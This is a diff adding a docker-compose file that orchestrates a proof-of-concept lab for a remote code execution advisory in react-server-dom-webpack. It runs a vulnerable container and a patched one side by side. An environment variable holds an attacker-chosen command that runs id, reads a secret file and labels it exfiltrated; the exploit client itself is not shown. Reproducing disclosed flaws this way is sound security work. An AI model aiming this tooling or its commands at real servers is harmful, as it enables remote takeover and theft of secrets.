@@ -1,0 +1,65 @@
+# GHSA-673q-mjm6-r5xr — remote RCE PoC orchestration.
+#
+#   victim           vulnerable react-server-dom-webpack@19.2.8  -> host :3000
+#   victim-patched   fixed      react-server-dom-webpack@19.2.9  -> host :3001
+#   poc              remote HTTP exploit (run on demand)
+#   evidence         root-cause reproducers, vuln vs patched (run on demand)
+#
+# Quick start:
+#   docker compose up -d --build victim victim-patched
+#   docker compose run --rm poc                      # pwns victim  (exit 0)
+#   docker compose run --rm poc-patched              # fails safely (exit 1)
+#   docker compose run --rm evidence                 # side-by-side root cause
+#
+# The poc client takes flags too (see `docker compose run --rm poc -h`):
+#   docker compose run --rm poc -t http://victim:3000 -c 'id'
+
+services:
+  victim:
+    build:
+      context: ./victim
+      args:
+        RSDW_VERSION: "19.2.8"   # VULNERABLE
+    image: ghsa-673q-victim:19.2.8
+    ports:
+      - "3000:3000"
+    environment:
+      PORT: "3000"
+
+  victim-patched:
+    build:
+      context: ./victim
+      args:
+        RSDW_VERSION: "19.2.9"   # PATCHED
+    image: ghsa-673q-victim:19.2.9
+    ports:
+      - "3001:3000"
+    environment:
+      PORT: "3000"
+
+  poc:
+    build:
+      context: ./poc
+    image: ghsa-673q-poc
+    depends_on:
+      - victim
+    environment:
+      TARGET: "http://victim:3000"
+      # Attacker-chosen command executed on the victim:
+      CMD: 'id; echo; echo "=== exfiltrated /app/SECRET.txt ==="; cat /app/SECRET.txt; echo; uname -a'
+
+  # Same exploit pointed at the patched victim — demonstrates the fix holds.
+  poc-patched:
+    build:
+      context: ./poc
+    image: ghsa-673q-poc
+    depends_on:
+      - victim-patched
+    environment:
+      TARGET: "http://victim-patched:3000"
+      CMD: 'id'
+
+  evidence:
+    build:
+      context: ./evidence
+    image: ghsa-673q-evidence
